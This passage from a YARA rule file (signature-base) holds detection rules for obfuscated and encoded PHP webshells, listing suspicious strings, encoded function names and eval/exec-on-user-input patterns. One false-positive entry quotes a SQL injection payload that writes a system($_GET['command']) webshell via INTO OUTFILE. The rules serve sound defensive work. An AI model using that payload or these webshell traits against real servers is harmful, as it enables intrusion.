		$gen_bit_sus31 = "Serv-u" wide ascii
		$gen_bit_sus32 = "Army" fullword wide ascii
		$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
		$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
		$gen_bit_sus35 = "crack" fullword wide ascii
		$gen_bit_sus44 = "<pre>" wide ascii
		$gen_bit_sus45 = "<PRE>" wide ascii
		$gen_bit_sus46 = "shell_" wide ascii
		$gen_bit_sus50 = "bypass" wide ascii
		$gen_bit_sus52 = " ^ $" wide ascii
		$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
		$gen_bit_sus55 = /\w'\.'\w/ wide ascii
		$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
		$gen_bit_sus57 = "dumper" wide ascii
		$gen_bit_sus59 = "'cmd'" wide ascii
		$gen_bit_sus60 = "\"execute\"" wide ascii
		$gen_bit_sus61 = "/bin/sh" wide ascii
		$gen_bit_sus62 = "Cyber" wide ascii
		$gen_bit_sus63 = "portscan" fullword wide ascii
		$gen_bit_sus66 = "whoami" fullword wide ascii
		$gen_bit_sus67 = "$password='" fullword wide ascii
		$gen_bit_sus68 = "$password=\"" fullword wide ascii
		$gen_bit_sus69 = "$cmd" fullword wide ascii
		$gen_bit_sus70 = "\"?>\"." fullword wide ascii
		$gen_bit_sus71 = "Hacking" fullword wide ascii
		$gen_bit_sus72 = "hacking" fullword wide ascii
		$gen_bit_sus73 = ".htpasswd" wide ascii
		$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
		$gen_much_sus7 = "Web Shell" nocase
		$gen_much_sus8 = "WebShell" nocase
		$gen_much_sus3 = "hidded shell"
		$gen_much_sus4 = "WScript.Shell.1" nocase
		$gen_much_sus5 = "AspExec"
		$gen_much_sus14 = "\\pcAnywhere\\" nocase
		$gen_much_sus15 = "antivirus" nocase
		$gen_much_sus16 = "McAfee" nocase
		$gen_much_sus17 = "nishang"
		$gen_much_sus18 = "\"unsafe" fullword wide ascii
		$gen_much_sus19 = "'unsafe" fullword wide ascii
		$gen_much_sus24 = "exploit" fullword wide ascii
		$gen_much_sus25 = "Exploit" fullword wide ascii
		$gen_much_sus26 = "TVqQAAMAAA" wide ascii
		$gen_much_sus30 = "Hacker" wide ascii
		$gen_much_sus31 = "HACKED" fullword wide ascii
		$gen_much_sus32 = "hacked" fullword wide ascii
		$gen_much_sus33 = "hacker" wide ascii
		$gen_much_sus34 = "grayhat" nocase wide ascii
		$gen_much_sus35 = "Microsoft FrontPage" wide ascii
		$gen_much_sus36 = "Rootkit" wide ascii
		$gen_much_sus37 = "rootkit" wide ascii
		$gen_much_sus38 = "/*-/*-*/" wide ascii
		$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
		$gen_much_sus40 = "\"e\"+\"v" wide ascii
		$gen_much_sus41 = "a\"+\"l\"" wide ascii
		$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
		$gen_much_sus43 = "q\"+\"u\"" wide ascii
		$gen_much_sus44 = "\"u\"+\"e" wide ascii
		$gen_much_sus45 = "/*//*/" wide ascii
		$gen_much_sus46 = "(\"/*/\"" wide ascii
		$gen_much_sus47 = "eval(eval(" wide ascii
		$gen_much_sus48 = "unlink(__FILE__)" wide ascii
		$gen_much_sus49 = "Shell.Users" wide ascii
		$gen_much_sus50 = "PasswordType=Regular" wide ascii
		$gen_much_sus51 = "-Expire=0" wide ascii
		$gen_much_sus60 = "_=$$_" wide ascii
		$gen_much_sus61 = "_=$$_" wide ascii
		$gen_much_sus62 = "++;$" wide ascii
		$gen_much_sus63 = "++; $" wide ascii
		$gen_much_sus64 = "_.=$_" wide ascii
		$gen_much_sus70 = "-perm -04000" wide ascii
		$gen_much_sus71 = "-perm -02000" wide ascii
		$gen_much_sus72 = "grep -li password" wide ascii
		$gen_much_sus73 = "-name config.inc.php" wide ascii
		$gen_much_sus75 = "password crack" wide ascii
		$gen_much_sus76 = "mysqlDll.dll" wide ascii
		$gen_much_sus77 = "net user" wide ascii
		$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
		$gen_much_sus81 = /strrev\(['"]/ wide ascii
		$gen_much_sus82 = "PHPShell" fullword wide ascii
		$gen_much_sus821 = "PHP Shell" fullword wide ascii
		$gen_much_sus83 = "phpshell" fullword wide ascii
		$gen_much_sus84 = "PHPshell" fullword wide ascii
		$gen_much_sus87 = "deface" wide ascii
		$gen_much_sus88 = "Deface" wide ascii
		$gen_much_sus89 = "backdoor" wide ascii
		$gen_much_sus90 = "r00t" fullword wide ascii
		$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
		$gen_much_sus92 = "base64_decode(base64_decode(" fullword wide ascii
		$gen_much_sus93 = "eval(\"/*" wide ascii
		$gen_much_sus94 = "http_response_code(404)" wide ascii
		$gif = { 47 49 46 38 }

	condition:
		not ( any of ($gfp*)) and not ( any of ($gfp_tiny*)) and ( any of ($inp*)) and ( not any of ($cfp*) and ( any of ($callback*) or all of ($m_callback*))) and ( filesize <1000 or ($gif at 0 or ( filesize <4KB and (1 of ($gen_much_sus*) or 2 of ($gen_bit_sus*))) or ( filesize <20KB and (2 of ($gen_much_sus*) or 3 of ($gen_bit_sus*))) or ( filesize <50KB and (2 of ($gen_much_sus*) or 4 of ($gen_bit_sus*))) or ( filesize <100KB and (2 of ($gen_much_sus*) or 6 of ($gen_bit_sus*))) or ( filesize <150KB and (3 of ($gen_much_sus*) or 7 of ($gen_bit_sus*))) or ( filesize <500KB and (4 of ($gen_much_sus*) or 8 of ($gen_bit_sus*)))))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Base64_Encoded_Payloads : FILE {
    meta:
		description = "php webshell containing base64 encoded payload"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "4e42b47d-725b-5e1f-9408-6c6329f60506"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L719-L869"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "88d0d4696c9cb2d37d16e330e236cb37cfaec4cd"
		hash = "e3b4e5ec29628791f836e15500f6fdea19beaf3e8d9981c50714656c50d3b365"
		hash = "e726cd071915534761822805724c6c6bfe0fcac604a86f09437f03f301512dc5"
		hash = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
		hash = "8cc9802769ede56f1139abeaa0735526f781dff3b6c6334795d1d0f19161d076"
		hash = "4cda0c798908b61ae7f4146c6218d7b7de14cbcd7c839edbdeb547b5ae404cd4"
		hash = "afd9c9b0df0b2ca119914ea0008fad94de3bd93c6919f226b793464d4441bdf4"
		hash = "b2048dc30fc7681094a0306a81f4a4cc34f0b35ccce1258c20f4940300397819"
		hash = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
		hash = "222cd9b208bd24955bcf4f9976f9c14c1d25e29d361d9dcd603d57f1ea2b0aee"
		hash = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
		hash = "6b6cd1ef7e78e37cbcca94bfb5f49f763ba2f63ed8b33bc4d7f9e5314c87f646"
		hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
		hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
		hash = "e2b1dfcfaa61e92526a3a444be6c65330a8db4e692543a421e19711760f6ffe2"
		logic_hash = "8f606dc3e1e688cca144fe769af50980b4c25fa69b08c67aca8c676a6a060010"
		score = 75
		quality = 17
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$decode1 = "base64_decode" fullword nocase wide ascii
		$decode2 = "openssl_decrypt" fullword nocase wide ascii
		$one1 = "leGVj"
		$one2 = "V4ZW"
		$one3 = "ZXhlY"
		$one4 = "UAeABlAGMA"
		$one5 = "lAHgAZQBjA"
		$one6 = "ZQB4AGUAYw"
		$two1 = "zaGVsbF9leGVj"
		$two2 = "NoZWxsX2V4ZW"
		$two3 = "c2hlbGxfZXhlY"
		$two4 = "MAaABlAGwAbABfAGUAeABlAGMA"
		$two5 = "zAGgAZQBsAGwAXwBlAHgAZQBjA"
		$two6 = "cwBoAGUAbABsAF8AZQB4AGUAYw"
		$three1 = "wYXNzdGhyd"
		$three2 = "Bhc3N0aHJ1"
		$three3 = "cGFzc3Rocn"
		$three4 = "AAYQBzAHMAdABoAHIAdQ"
		$three5 = "wAGEAcwBzAHQAaAByAHUA"
		$three6 = "cABhAHMAcwB0AGgAcgB1A"
		$four1 = "zeXN0ZW"
		$four2 = "N5c3Rlb"
		$four3 = "c3lzdGVt"
		$four4 = "MAeQBzAHQAZQBtA"
		$four5 = "zAHkAcwB0AGUAbQ"
		$four6 = "cwB5AHMAdABlAG0A"
		$five1 = "wb3Blb"
		$five2 = "BvcGVu"
		$five3 = "cG9wZW"
		$five4 = "AAbwBwAGUAbg"
		$five5 = "wAG8AcABlAG4A"
		$five6 = "cABvAHAAZQBuA"
		$six1 = "wcm9jX29wZW"
		$six2 = "Byb2Nfb3Blb"
		$six3 = "cHJvY19vcGVu"
		$six4 = "AAcgBvAGMAXwBvAHAAZQBuA"
		$six5 = "wAHIAbwBjAF8AbwBwAGUAbg"
		$six6 = "cAByAG8AYwBfAG8AcABlAG4A"
		$seven1 = "wY250bF9leGVj"
		$seven2 = "BjbnRsX2V4ZW"
		$seven3 = "cGNudGxfZXhlY"
		$seven4 = "AAYwBuAHQAbABfAGUAeABlAGMA"
		$seven5 = "wAGMAbgB0AGwAXwBlAHgAZQBjA"
		$seven6 = "cABjAG4AdABsAF8AZQB4AGUAYw"
		$eight1 = "ldmFs"
		$eight2 = "V2YW"
		$eight3 = "ZXZhb"
		$eight4 = "UAdgBhAGwA"
		$eight5 = "lAHYAYQBsA"
		$eight6 = "ZQB2AGEAbA"
		$nine1 = "hc3Nlcn"
		$nine2 = "Fzc2Vyd"
		$nine3 = "YXNzZXJ0"
		$nine4 = "EAcwBzAGUAcgB0A"
		$nine5 = "hAHMAcwBlAHIAdA"
		$nine6 = "YQBzAHMAZQByAHQA"
		$execu1 = "leGVjd"
		$execu2 = "V4ZWN1"
		$execu3 = "ZXhlY3"
		$esystem1 = "lc3lzdGVt"
		$esystem2 = "VzeXN0ZW"
		$esystem3 = "ZXN5c3Rlb"
		$opening1 = "vcGVuaW5n"
		$opening2 = "9wZW5pbm"
		$opening3 = "b3BlbmluZ"
		$fp1 = { D0 CF 11 E0 A1 B1 1A E1 }
		$fp2 = "YXBpLnRlbGVncmFtLm9"
		$fp3 = " GET /"
		$fp4 = " POST /"
		$fpa1 = "/cn=Recipients"
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <300KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and not any of ($fp*) and any of ($decode*) and (( any of ($one*) and not any of ($execu*)) or any of ($two*) or any of ($three*) or ( any of ($four*) and not any of ($esystem*)) or ( any of ($five*) and not any of ($opening*)) or any of ($six*) or any of ($seven*) or any of ($eight*) or any of ($nine*))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Unknown_1 : FILE {
    meta:
		description = "obfuscated php webshell"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "93d01a4c-4c18-55d2-b682-68a1f6460889"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L871-L893"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1"
		hash = "cf4abbd568ce0c0dfce1f2e4af669ad2"
		logic_hash = "ce2d4c87c001a45febf7eac5474aa0d24ea73067f9154203ef5653bf77e7028f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sp0 = /^<\?php \$[a-z]{3,30} = '/ wide ascii
		$sp1 = "=explode(chr(" wide ascii
		$sp2 = "; if (!function_exists('" wide ascii
		$sp3 = " = NULL; for(" wide ascii

	condition:
		filesize <300KB and all of ($sp*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Generic_Eval : FILE {
    meta:
		description = "Generic PHP webshell which uses any eval/exec function in the same line with user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "79cfbd88-f6f7-5cba-a325-0a99962139ca"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L895-L954"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a61437a427062756e2221bfb6d58cd62439d09d9"
		hash = "90c5cc724ec9cf838e4229e5e08955eec4d7bf95"
		hash = "2b41abc43c5b6c791d4031005bf7c5104a98e98a00ee24620ce3e8e09a78e78f"
		hash = "5c68a0fa132216213b66a114375b07b08dc0cb729ddcf0a29bff9ca7a22eaaf4"
		hash = "de3c01f55d5346577922bbf449faaaaa1c8d1aaa64c01e8a1ee8c9d99a41a1be"
		hash = "124065176d262bde397b1911648cea16a8ff6a4c8ab072168d12bf0662590543"
		hash = "cd7450f3e5103e68741fd086df221982454fbcb067e93b9cbd8572aead8f319b"
		hash = "ab835ce740890473adf5cc804055973b926633e39c59c2bd98da526b63e9c521"
		hash = "31ff9920d401d4fbd5656a4f06c52f1f54258bc42332fc9456265dca7bb4c1ea"
		hash = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
		hash = "80e98e8a3461d7ba15d869b0641cdd21dd5b957a2006c3caeaf6f70a749ca4bb"
		hash = "93982b8df76080e7ba4520ae4b4db7f3c867f005b3c2f84cb9dff0386e361c35"
		hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
		hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
		hash = "7ca5dec0515dd6f401cb5a52c313f41f5437fc43eb62ea4bcc415a14212d09e9"
		hash = "fd5f0f81204ca6ca6e93343500400d5853012e88254874fc9f62efe0fde7ab3c"
		hash = "883f48ed4e9646da078cabf6b8b4946d9f199660262502650f76450ecf60ddd5"
		hash = "6d042b6393669bb4d98213091cabe554ab192a6c916e86c04d06cc2a4ca92c00"
		hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"
		logic_hash = "4b7759e4761f5897bfb5e576df645a2e99cec4e703fb28d0fc275cf8f8848263"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$geval = /\b(exec|shell_exec|passthru|system|popen|proc_open|pcntl_exec|eval|assert)[\t ]{0,300}(\(base64_decode)?(\(stripslashes)?[\t ]{0,300}(\(trim)?[\t ]{0,300}\(\$(_POST|_GET|_REQUEST|_SERVER\s?\[['"]HTTP_|GLOBALS\[['"]_(POST|GET|REQUEST))/ wide ascii
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
		$gfp_3 = " GET /"
		$gfp_4 = " POST /"

	condition:
		filesize <300KB and not ( any of ($gfp*)) and $geval
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Double_Eval_Tiny : FILE {
    meta:
		description = "PHP webshell which probably hides the input inside an eval()ed obfuscated string"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "868db363-83d3-57e2-ac8d-c6125e9bdd64"
		date = "2021-01-11"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L956-L1007"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f66fb918751acc7b88a17272a044b5242797976c73a6e54ac6b04b02f61e9761"
		hash = "6b2f0a3bd80019dea536ddbf92df36ab897dd295840cb15bb7b159d0ee2106ff"
		hash = "aabfd179aaf716929c8b820eefa3c1f613f8dcac"
		hash = "9780c70bd1c76425d4313ca7a9b89dda77d2c664"
		hash = "006620d2a701de73d995fc950691665c0692af11"
		logic_hash = "cf0405e8a44497574d75291bf86bf9413d9a64140e820f7f5a655fe5302c6918"
		score = 75
		quality = 42
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload = /(\beval[\t ]{0,500}\([^)]|\bassert[\t ]{0,500}\([^)])/ nocase wide ascii
		$fp1 = "clone" fullword wide ascii
		$fp2 = "* @assert" ascii
		$fp3 = "*@assert" ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize >70 and filesize <300 and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and #payload>=2 and not any of ($fp*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC : FILE {
    meta:
		description = "PHP webshell obfuscated"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f66e337b-8478-5cd3-b01a-81133edaa8e5"
		date = "2021-01-12"
		modified = "2024-03-11"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1009-L1135"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "eec9ac58a1e763f5ea0f7fa249f1fe752047fa60"
		hash = "181a71c99a4ae13ebd5c94bfc41f9ec534acf61cd33ef5bce5fb2a6f48b65bf4"
		hash = "76d4e67e13c21662c4b30aab701ce9cdecc8698696979e504c288f20de92aee7"
		hash = "1d0643927f04cb1133f00aa6c5fa84aaf88e5cf14d7df8291615b402e8ab6dc2"
		logic_hash = "8d7150a4fc657efe3526d5f8f624a66e7186a3f42b4605cc349bd31deeb71b7f"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$o1 = "chr(" nocase wide ascii
		$o2 = "chr (" nocase wide ascii
		$o3 = "goto" fullword nocase wide ascii
		$o4 = "\\x9" wide ascii
		$o5 = "\\x3" wide ascii
		$o6 = "\\61" wide ascii
		$o7 = "\\44" wide ascii
		$o8 = "\\112" wide ascii
		$o9 = "\\120" wide ascii
		$fp1 = "$goto" wide ascii
		$cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
		$cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
		$cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii
		$m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
		$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii

	condition:
		not ( any of ($gfp*)) and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and ( not $fp1 and (( filesize <20KB and ((#o1+#o2)>50 or #o3>10 or (#o4+#o5+#o6+#o7+#o8+#o9)>20)) or ( filesize <200KB and ((#o1+#o2)>200 or #o3>30 or (#o4+#o5+#o6+#o7+#o8+#o9)>30)))) and ( any of ($cpayload*) or all of ($m_cpayload_preg_filter*))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC_Encoded : FILE {
    meta:
		description = "PHP webshell obfuscated by encoding"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "134c1189-1b41-58d5-af66-beaa4795a704"
		date = "2021-04-18"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1137-L1188"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "119fc058c9c5285498a47aa271ac9a27f6ada1bf4d854ccd4b01db993d61fc52"
		hash = "d5ca3e4505ea122019ea263d6433221030b3f64460d3ce2c7d0d63ed91162175"
		hash = "8a1e2d72c82f6a846ec066d249bfa0aaf392c65149d39b7b15ba19f9adc3b339"
		logic_hash = "c2a88e48374f949fcc9c14b773f7709c96b3147d1982ae9721708474ee5a3dcd"
		score = 70
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$enc_eval1 = /(e|\\x65|\\101)(\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
		$enc_eval2 = /(\\x65|\\101)(v|\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
		$enc_assert1 = /(a|\\97|\\x61)(\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
		$enc_assert2 = /(\\97|\\x61)(s|\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <700KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and any of ($enc*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC_Encoded_Mixed_Dec_And_Hex : FILE {
    meta:
		description = "PHP webshell obfuscated by encoding of mixed hex and dec"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "9ae920e2-17c8-58fd-8566-90d461a54943"
		date = "2021-04-18"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1190-L1246"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0e21931b16f30b1db90a27eafabccc91abd757fa63594ba8a6ad3f477de1ab1c"
		hash = "929975272f0f42bf76469ed89ebf37efcbd91c6f8dac1129c7ab061e2564dd06"
		hash = "88fce6c1b589d600b4295528d3fcac161b581f739095b99cd6c768b7e16e89ff"
		hash = "883f48ed4e9646da078cabf6b8b4946d9f199660262502650f76450ecf60ddd5"
		hash = "50389c3b95a9de00220fc554258fda1fef01c62dad849e66c8a92fc749523457"
		hash = "c4ab4319a77b751a45391aa01cde2d765b095b0e3f6a92b0b8626d5c7e3ad603"
		hash = "df381f04fca2522e2ecba0f5de3f73a655d1540e1cf865970f5fa3bf52d2b297"
		hash = "401388d8b97649672d101bf55694dd175375214386253d0b4b8d8d801a89549c"
		hash = "99fc39a12856cc1a42bb7f90ffc9fe0a5339838b54a63e8f00aa98961c900618"
		hash = "fb031af7aa459ee88a9ca44013a76f6278ad5846aa20e5add4aeb5fab058d0ee"
		hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"
		hash = "0ff05e6695074f98b0dee6200697a997c509a652f746d2c1c92c0b0a0552ca47"
		logic_hash = "d9b4d224d43915cf08050c173627b314c3e41a30ecfffe28038281eadc114e51"
		score = 75
		quality = 17
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$mix = /['"](\w|\\x?[0-9a-f]{2,3})[\\x0-9a-f]{2,20}\\\d{1,3}[\\x0-9a-f]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
